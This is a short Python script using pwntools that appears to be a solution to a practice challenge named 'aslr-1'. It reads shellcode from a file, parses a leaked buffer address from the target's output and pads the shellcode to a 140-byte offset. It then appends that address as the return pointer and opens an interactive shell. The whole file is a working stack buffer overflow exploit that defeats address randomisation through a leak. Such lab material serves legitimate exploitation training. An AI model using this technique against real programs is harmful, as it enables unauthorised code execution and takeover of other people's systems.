#!/usr/bin/env python

from pwn import *

offset = 140
shellcode = ''

with open('shellcode.bin', 'r') as f:
    shellcode = f.readline()

p = process('./aslr-1')

buffer = int(p.recv(0x100).split()[4], 16);

inp = shellcode
inp += 'A' * (offset - len(shellcode))
inp += p32(buffer)

p.send(inp)
p.interactive()
